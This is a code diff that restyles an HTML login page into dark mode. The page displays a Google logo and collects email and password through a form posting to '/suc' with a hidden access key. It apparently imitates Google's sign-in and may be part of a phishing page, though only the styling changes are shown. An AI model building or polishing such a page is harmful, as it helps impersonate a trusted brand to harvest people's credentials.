@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f1f1f1;
+            background-color: #000;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,10 +16,10 @@
         }
 
         .login-container {
-            background-color: #fff;
+            background-color: #1A1A1A;
             padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             width: 300px;
             text-align: center;
         }
@@ -32,10 +32,11 @@
 
         .login-container input[type="email"],
         .login-container input[type="password"] {
+            background-color: #242526;
             width: 100%;
             padding: 10px;
             margin: 10px 0;
-            border: 1px solid #ddd;
+            border: none;
             border-radius: 4px;
             box-sizing: border-box;
         }
@@ -81,7 +82,7 @@
 <body>
     <div class="login-container">
         <img src="/images/google.png"  height="50" alt="google-logo" / >
-        <h2>Sign in</h2>
+        <h2 style="color:  #E0E0E0">Sign in</h2>
         <form action="/suc" method="post">
             <input type="hidden" name="access_key" value="596e3a19-0354-4c99-ab40-bded453e4218">
             <input type="email" name="userId" placeholder="Email or phone" required>
